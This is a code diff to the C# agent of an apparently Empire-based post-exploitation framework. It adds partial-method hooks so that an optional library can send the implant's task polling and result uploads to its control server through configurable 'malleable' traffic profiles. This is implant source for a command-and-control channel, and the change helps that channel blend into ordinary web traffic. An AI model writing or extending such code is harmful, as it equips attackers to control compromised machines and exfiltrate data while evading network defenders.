@@ -80,7 +80,10 @@ AESc = AES encrypted using the client's session key
             [X...]     - tasking data
 
 */
-    class Coms
+    // Partial so the optional SharpireMalleable source library can extend it
+    // with malleable-profile-aware request handling without the base build
+    // referencing any malleable types.
+    partial class Coms
     {
         public SessionInfo sessionInfo;
 
@@ -255,10 +258,30 @@ AESc = AES encrypted using the client's session key
 
         internal byte[] GetTask()
         {
+            byte[] routingPacket = NewRoutingPacket(null, 4);
+
+            // Malleable hook: the SharpireMalleable source library (optional)
+            // implements TryMalleableGet to drive this request via a runtime
+            // profile. Without that library, the partial method is a no-op,
+            // handled stays false, and we fall through to the legacy cookie
+            // path below.
+            byte[] malleableResult = null;
+            bool malleableUsed = false;
+            TryMalleableGet(routingPacket, ref malleableResult, ref malleableUsed);
+            if (malleableUsed)
+            {
+                if (malleableResult == null) return null;
+                string mStr = System.Text.Encoding.UTF8.GetString(malleableResult);
+                if (mStr.TrimStart().StartsWith("<!DOCTYPE", StringComparison.OrdinalIgnoreCase))
+                {
+                    return null;
+                }
+                return malleableResult;
+            }
+
             byte[] results = new byte[0];
             try
             {
-                byte[] routingPacket = NewRoutingPacket(null, 4);
                 string routingCookie = Convert.ToBase64String(routingPacket);
 
                 WebClient webClient = new WebClient();
@@ -293,6 +316,13 @@ AESc = AES encrypted using the client's session key
             byte[] encryptedBytes = EmpireStager.AesEncryptThenHmac(sessionInfo.GetSessionKeyBytes(), packets);
             byte[] routingPacket = NewRoutingPacket(encryptedBytes, 5);
 
+            // Malleable hook (see GetTask). No-op when SharpireMalleable isn't
+            // compiled in; when it is, the extension returns handled=true after
+            // issuing the profile-driven POST.
+            bool malleableUsed = false;
+            TryMalleableSend(routingPacket, ref malleableUsed);
+            if (malleableUsed) return;
+
             Random random = new Random();
             string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];
 
@@ -312,6 +342,19 @@ AESc = AES encrypted using the client's session key
             }
 
         }
+
+        // Hook implemented by SharpireMalleable/Empire.Agent.Malleable.cs
+        // when the malleable source library is compiled in. Returns via `ref
+        // handled` whether the request was taken over by the malleable
+        // pipeline; `responseBytes` carries the response on success (or null
+        // on a handled-but-failed request). If SharpireMalleable isn't
+        // compiled in, the partial method is a no-op — handled stays false
+        // and the caller falls back to the legacy cookie path.
+        partial void TryMalleableGet(byte[] routingPacket, ref byte[] responseBytes, ref bool handled);
+
+        // Counterpart for POST task-result uploads. Same no-op-when-absent
+        // semantics as TryMalleableGet.
+        partial void TryMalleableSend(byte[] routingPacket, ref bool handled);
 
         private void ProcessTaskingPackets(byte[] encryptedTask)
         {
